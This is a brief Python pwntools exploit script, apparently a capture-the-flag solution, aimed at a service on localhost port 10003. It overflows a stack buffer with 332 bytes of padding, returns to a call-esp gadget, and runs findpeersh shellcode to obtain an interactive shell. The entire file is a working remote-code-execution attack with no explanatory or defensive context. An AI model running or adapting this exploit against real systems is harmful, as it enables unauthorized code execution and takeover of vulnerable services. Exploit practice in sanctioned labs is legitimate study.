#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *

context(arch = "i386", os = "linux")

SHELLCODE = asm(shellcraft.findpeersh())
RET_OFFSET = 332 #Found by sending cyclic data
CALL_ESP = 0x08048a42 #Found with "ROPgadget --binary $A | grep -E ': ((jmp)|(call)) ((ecx)|(esp))'"

r = remote('localhost', 10003)
r.send(flat(0xffffffff,
            'A' * RET_OFFSET,
            CALL_ESP, #Return to this address, ESP will point to next address where we place our shellcode
            SHELLCODE))
r.interactive()
